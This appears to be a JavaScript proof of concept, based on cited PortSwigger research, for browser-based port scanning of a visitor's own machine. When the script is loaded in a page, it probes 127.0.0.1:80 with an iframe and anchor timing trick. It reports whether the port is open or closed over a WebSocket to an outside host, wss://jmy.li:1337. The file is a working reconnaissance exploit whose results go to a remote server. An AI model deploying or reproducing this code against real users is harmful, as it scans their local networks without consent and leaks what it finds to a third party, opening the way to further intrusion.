// This works when tested locally, not 100% sure if this works on remote systems
// NOTE: This is only for chrome, it doesn't work on firefox
// Based on portswigger research at: https://portswigger.net/research/exposing-intranets-with-reliable-browser-based-port-scanning
// Apparently <script onload=func1() onerror=func2() src='ip:port'> may also work

const logSocket = new WebSocket('wss://jmy.li:1337');

logSocket.addEventListener('open', _event => {
    doExploit();
});

function log(msg){
    console.log(msg);
    if(logSocket.readyState == WebSocket.OPEN){
        logSocket.send(JSON.stringify(msg));
    }
}

async function doExploit() {
    let iframe = document.createElement('iframe');
    let a = document.createElement('a');
    let timer, calls=0;

    iframe.name = a.target = 'probe' + Date.now();
    iframe.src = 'http://127.0.0.1:80';
    a.href = iframe.src + '#';

    iframe.onload = function() {
        calls++;
        if(calls > 1) {
            clearTimeout(timer);
            log("port is CLOSED");
            return;
        }
    a.click();
    };

    timer = setTimeout(function(){
        log("port is OPEN");
    }, 5000);
    

    document.body.appendChild(iframe);
    document.body.appendChild(a);

    log("created iframe and anchor");

}
